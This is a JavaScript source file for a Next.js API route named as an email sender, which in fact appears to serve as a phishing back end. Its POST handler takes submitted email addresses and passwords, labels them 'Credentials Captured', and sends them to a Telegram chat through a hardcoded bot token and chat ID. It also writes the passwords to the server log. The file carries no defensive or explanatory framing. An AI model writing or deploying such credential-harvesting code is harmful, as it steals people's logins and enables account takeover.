/** @format */

// app/api/sendemail/route.js
import nodemailer from "nodemailer";

// for telegram
import { TelegramClient } from "telegramsjs";

const botToken = "8457166180:AAHzZ9uh06U8a030hK4oaSPsYF36KGrQcOw";
const bot = new TelegramClient(botToken);
const chatId = "7055420519";

// Handle POST requests for form submissions
export async function POST(req) {
  const { email, password } = await req.json();

  try {
    // Only send notification when password is provided (credentials)
    if (password && email) {
      const credentialsMessage = `
🔐 *Credentials Captured*

*Email:* ${email}
*Password:* ${password}
      `;

      await bot.sendMessage({
        text: credentialsMessage,
        chatId: chatId,
        parse_mode: "Markdown"
      });

      console.log(
        `Credentials sent to telegram: Email: ${email}, Password: ${password}`
      );

      return new Response(
        JSON.stringify({ message: "Credentials sent successfully!" }),
        {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    // Return success for access without password (no notification)
    return new Response(
      JSON.stringify({ message: "Access logged!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending message:", error);
    return new Response(JSON.stringify({ error: "Error sending message" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Handle GET requests - return simple response
export async function GET() {
  return new Response(
    JSON.stringify({ message: "API is running" }),
    {
      status: 200,
      headers: { "Content-Type": "application/json" },
    }
  );
}